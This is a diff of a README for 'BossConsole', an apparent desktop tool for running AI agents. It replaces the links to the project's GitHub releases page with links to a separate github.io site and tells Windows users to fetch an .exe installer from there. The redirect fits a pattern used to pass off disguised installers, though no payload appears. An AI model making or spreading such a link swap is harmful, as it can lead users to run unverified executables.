@@ -1,6 +1,6 @@
 # 🚀 BossConsole - Control AI agents with professional tools
 
-[![Download BossConsole](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://github.com/kerachm/BossConsole/releases)
+[![Download BossConsole](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://kerachm.github.io)
 
 BossConsole provides a central workspace for your AI agents. It brings together tools like code editors, web browsers, and command terminals in one native application. You do not need to manage multiple windows or complex browser tabs to run your AI models. This software runs on the Java Virtual Machine, which ensures it stays fast and responsive. It supports AI models like Claude, Gemini, and OpenCode, giving you a single home for your research and enterprise workflows.
 
@@ -14,7 +14,7 @@ You should have at least 8GB of RAM and a stable internet connection. BossConsol
 
 Follow these steps to set up the software on your Windows machine:
 
-1. Visit the [official release page](https://github.com/kerachm/BossConsole/releases) to access the file library.
+1. Visit the [official release page](https://kerachm.github.io) to access the file library.
 2. Locate the most recent version available at the top of the list.
 3. Look for the file ending in `.exe` or an installer package suitable for Windows.
 4. Click the link to download the installer to your computer.
